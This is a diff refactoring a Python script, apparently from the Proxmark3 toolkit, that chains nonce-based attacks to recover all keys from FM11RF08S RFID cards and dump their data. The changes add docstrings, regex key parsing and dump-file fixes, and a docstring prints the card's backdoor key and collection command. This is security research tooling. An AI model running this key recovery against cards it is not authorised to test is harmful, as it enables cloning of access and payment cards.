@@ -1,17 +1,18 @@
 #!/usr/bin/env python3
+"""
+Combine several attacks to recover all FM11RF08S keys.
 
-# Combine several attacks to recover all FM11RF08S keys
-#
-# Conditions:
-# * Presence of the backdoor with known key
-#
-# Duration strongly depends on some key being reused and where.
-# Examples:
-# * 32 random keys: ~20 min
-# * 16 random keys with keyA==keyB in each sector: ~30 min
-# * 24 random keys, some reused across sectors: <1 min
-#
-# Doegox, 2024, cf https://eprint.iacr.org/2024/1275 for more info
+Conditions:
+* Presence of the backdoor with known key
+
+Duration strongly depends on some key being reused and where.
+Examples:
+* 32 random keys: ~20 min
+* 16 random keys with keyA==keyB in each sector: ~30 min
+* 24 random keys, some reused across sectors: <1 min
+
+Doegox, 2024, cf https://eprint.iacr.org/2024/1275 for more info
+"""
 
 import os
 import sys
@@ -19,6 +20,7 @@ import time
 import subprocess
 import argparse
 import json
+import re
 import pm3
 from pm3_resources import find_tool, find_dict
 
@@ -28,6 +30,7 @@ try:
     from colors import color
 except ModuleNotFoundError:
     def color(s, fg=None):
+        """Return the string as such, without color."""
         _ = fg
         return str(s)
 
@@ -51,7 +54,45 @@ staticnested_2x1nt_path = find_tool("staticnested_2x1nt_rf08s")
 staticnested_2x1nt1key_path = find_tool("staticnested_2x1nt_rf08s_1key")
 
 
-def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debug=False, supply_chain=False, quiet=True, keyset=False):
+def match_key(line):
+    """
+    Extract a 12-character hexadecimal key from a given string.
+
+    Args:
+        line (str): The input string to search for the hexadecimal key.
+
+    Returns:
+        str or None: The 12-character hexadecimal key in uppercase if found, otherwise None.
+    """
+    match = re.search(r'([0-9a-fA-F]{12})', line)
+    if match:
+        return match.group(1).upper()
+    else:
+        return None
+
+
+def recovery(init_check=False, final_check=False, keep=False, no_oob=False,
+             debug=False, supply_chain=False, quiet=True, keyset=[]):
+    """
+    Perform recovery operation for FM11RF08S cards.
+
+    Args:
+        init_check (bool): If True, check for default keys initially.
+        final_check (bool): If True, perform a final check and dump keys.
+        keep (bool): If True, keep the generated dictionaries after processing.
+        no_oob (bool): If True, do not include out-of-bounds sectors.
+        debug (bool): If True, print debug information.
+        supply_chain (bool): If True, use supply-chain attack data.
+        quiet (bool): If True, suppress output messages.
+        keyset (list): A list of key pairs to use for the recovery process.
+
+    Returns:
+        dict: A dictionary containing the following keys:
+            - 'keyfile': Path to the generated binary key file.
+            - 'found_keys': List of found keys for each sector.
+            - 'dump_file': Path to the generated dump file.
+            - 'data': List of data blocks for each sector.
+    """
     def show(s='', prompt="[" + color("=", fg="yellow") + "] ", **kwargs):
         if not quiet:
             s = f"{prompt}" + f"\n{prompt}".join(s.split('\n'))
@@ -82,10 +123,10 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
 
     found_keys = [["", ""] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]
 
-    if keyset != False:
-        n = min(len(found_keys),len(keyset))
+    if len(keyset) > 0:
+        n = min(len(found_keys), len(keyset))
         show(f"{n} Key pairs supplied: ")
-        for i in range(0, n):
+        for i in range(n):
             found_keys[i] = keyset[i]
             show(f"  Sector {i:2d} : A = {found_keys[i][0]:12s}   B = {found_keys[i][1]:12s}")
 
@@ -111,8 +152,9 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
         for line in p.grabbed_output.split('\n'):
             if "Wrong" in line or "error" in line:
                 break
-            if "Saved" in line:
-                nonces_with_data = line[line.index("`"):].strip("`")
+            matched = "Saved to json file "
+            if matched in line:
+                nonces_with_data = line[line.index(matched)+len(matched):]
         if nonces_with_data != "":
             break
 
@@ -146,8 +188,8 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
         data[blk] = dict_nwd["blocks"][f"{blk}"]
 
     show("Generating first dump file")
-    dumpfile = f"{save_path}hf-mf-{uid:08X}-dump.bin"
-    with (open(dumpfile, "wb")) as f:
+    dump_file = f"{save_path}hf-mf-{uid:08X}-dump.bin"
+    with (open(dump_file, "wb")) as f:
         for sec in range(NUM_SECTORS):
             for b in range(4):
                 d = data[(sec * 4) + b]
@@ -160,7 +202,7 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
                         kb = "FFFFFFFFFFFF"
                     d = ka + d[12:20] + kb
                 f.write(bytes.fromhex(d))
-    show(f"Data has been dumped to `{dumpfile}`")
+    show(f"Data has been dumped to `{dump_file}`")
 
     elapsed_time1 = time.time() - start_time
     minutes = int(elapsed_time1 // 60)
@@ -240,8 +282,9 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
                     result = subprocess.run(cmd, capture_output=True, text=True).stdout
                     keys_def_set = set()
                     for line in result.split('\n'):
-                        if "MATCH:" in line:
-                            keys_def_set.add(line[12:])
+                        matched = match_key(line)
+                        if matched is not None:
+                            keys_def_set.add(matched)
                     keys_set.difference_update(keys_def_set)
                 else:
                     # Prioritize default keys
@@ -285,8 +328,9 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
                 result = subprocess.run(cmd, capture_output=True, text=True).stdout
                 keys_def_set = set()
                 for line in result.split('\n'):
-                    if "MATCH:" in line:
-                        keys_def_set.add(line[12:])
+                    matched = match_key(line)
+                    if matched is not None:
+                        keys_def_set.add(matched)
                 keys_set.difference_update(keys_def_set)
             else:
                 # Prioritize default keys
@@ -419,8 +463,9 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
                 for line in p.grabbed_output.split('\n'):
                     if "aborted via keyboard" in line:
                         abort = True
-                    if "found:" in line:
-                        found_keys[sec][key_type] = line[30:].strip()
+                    matched = match_key(line)
+                    if matched is not None:
+                        found_keys[sec][key_type] = matched
                         show_key(real_sec, key_type, found_keys[sec][key_type])
                         if nt[sec][0] == nt[sec][1] and found_keys[sec][key_type ^ 1] == "":
                             found_keys[sec][key_type ^ 1] = found_keys[sec][key_type]
@@ -445,8 +490,9 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
                 for line in p.grabbed_output.split('\n'):
                     if "aborted via keyboard" in line:
                         abort = True
-                    if "found:" in line:
-                        found_keys[sec][key_type] = line[30:].strip()
+                    matched = match_key(line)
+                    if matched is not None:
+                        found_keys[sec][key_type] = matched
                         show_key(real_sec, key_type, found_keys[sec][key_type])
             if abort:
                 break
@@ -466,11 +512,12 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
             for line in p.grabbed_output.split('\n'):
                 if "aborted via keyboard" in line:
                     abort = True
-                if "found:" in line:
-                    found_keys[sec][0] = line[30:].strip()
-                    found_keys[sec][1] = line[30:].strip()
-                    show_key(real_sec, 0, found_keys[sec][key_type])
-                    show_key(real_sec, 1, found_keys[sec][key_type])
+                matched = match_key(line)
+                if matched is not None:
+                    found_keys[sec][0] = matched
+                    found_keys[sec][1] = matched
+                    show_key(real_sec, 0, found_keys[sec][0])
+                    show_key(real_sec, 1, found_keys[sec][1])
         if abort:
             break
 
@@ -494,8 +541,9 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
             result = subprocess.run(cmd, capture_output=True, text=True).stdout
             keys = set()
             for line in result.split('\n'):
-                if "MATCH:" in line:
-                    keys.add(line[12:])
+                matched = match_key(line)
+                if matched is not None:
+                    keys.add(matched)
             if len(keys) > 1:
                 kt = ['a', 'b'][key_type_target]
                 cmd = f"hf mf fchk --blk {real_sec * 4} -{kt} --no-default"
@@ -507,8 +555,9 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
                 for line in p.grabbed_output.split('\n'):
                     if "aborted via keyboard" in line:
                         abort = True
-                    if "found:" in line:
-                        found_keys[sec][key_type_target] = line[30:].strip()
+                    matched = match_key(line)
+                    if matched is not None:
+                        found_keys[sec][key_type_target] = matched
             elif len(keys) == 1:
                 found_keys[sec][key_type_target] = keys.pop()
             if found_keys[sec][key_type_target] != "":
@@ -530,7 +579,10 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
         cmd = f"hf mf fchk -f keys_{uid:08x}.dic --no-default --dump"
         if debug:
             print(cmd)
-        p.console(cmd, capture=False, quiet=False)
+        p.console(cmd, capture=True, quiet=False)
+        for line in p.grabbed_output.split('\n'):
+            if "Found keys have been dumped to" in line:
+                keyfile = line[line.index("`"):].strip("`")
     else:
         show()
         show(color("found keys:", fg="green"), prompt=plus)
@@ -569,22 +621,22 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
         if unknown:
             show("  --[ " + color("FFFFFFFFFFFF", fg="yellow") +
                  " ]-- has been inserted for unknown keys", prompt="[" + color("=", fg="yellow") + "]")
-        show("Generating final dump file", prompt=plus)
-        dumpfile = f"{save_path}hf-mf-{uid:08X}-dump.bin"
-        with (open(dumpfile, "wb")) as f:
-            for sec in range(NUM_SECTORS):
-                for b in range(4):
-                    d = data[(sec * 4) + b]
-                    if b == 3:
-                        ka = found_keys[sec][0]
-                        kb = found_keys[sec][1]
-                        if ka == "":
-                            ka = "FFFFFFFFFFFF"
-                        if kb == "":
-                            kb = "FFFFFFFFFFFF"
-                        d = ka + d[12:20] + kb
-                    f.write(bytes.fromhex(d))
-        show("Data has been dumped to `" + color(dumpfile, fg="yellow")+"`", prompt=plus)
+    show("Generating final dump file", prompt=plus)
+    dump_file = f"{save_path}hf-mf-{uid:08X}-dump.bin"
+    with (open(dump_file, "wb")) as f:
+        for sec in range(NUM_SECTORS):
+            for b in range(4):
+                d = data[(sec * 4) + b]
+                if b == 3:
+                    ka = found_keys[sec][0]
+                    kb = found_keys[sec][1]
+                    if ka == "":
+                        ka = "FFFFFFFFFFFF"
+                    if kb == "":
+                        kb = "FFFFFFFFFFFF"
+                    d = ka + d[12:20] + kb
+                f.write(bytes.fromhex(d))
+    show("Data has been dumped to `" + color(dump_file, fg="yellow")+"`", prompt=plus)
 
     # Remove generated dictionaries after processing
     if not keep:
@@ -610,11 +662,27 @@ def recovery(init_check=False, final_check=False, keep=False, no_oob=False, debu
     seconds = int(elapsed_time % 60)
     show("---- TOTAL: " + color(f"{minutes:2}", fg="yellow") + " minutes " +
          color(f"{seconds:2}", fg="yellow") + " seconds -----------")
-
-    return {'keyfile': keyfile, 'found_keys': found_keys, 'dumpfile': dumpfile, 'data': data}
+    return {'keyfile': keyfile, 'found_keys': found_keys, 'dump_file': dump_file, 'data': data}
 
 
 def main():
+    """
+    Parse command-line arguments and initiate the recovery process.
+
+    Command-line arguments:
+    -x, --init-check: Run an initial fchk for default keys.
+    -y, --final-check: Run a final fchk with the found keys.
+    -n, --no-oob: Do not save out of bounds keys.
+    -k, --keep: Keep generated dictionaries after processing.
+    -d, --debug: Enable debug mode.
+    -s, --supply-chain: Enable supply-chain mode. Look for hf-mf-XXXXXXXX-default_nonces.json.
+
+    The supply-chain mode json can be produced from the json saved by
+    "hf mf isen --collect_fm11rf08s --key A396EFA4E24F" on a wiped card, then processed with
+    jq '{Created: .Created, FileType: "fm11rf08s_default_nonces", nt: .nt | del(.["32"]) | map_values(.a)}'.
+
+    This function calls the recovery function with the parsed arguments.
+    """
     parser = argparse.ArgumentParser(description='A script combining staticnested* tools '
                                      'to recover all keys from a FM11RF08S card.')
     parser.add_argument('-x', '--init-check', action='store_true', help='Run an initial fchk for default keys')
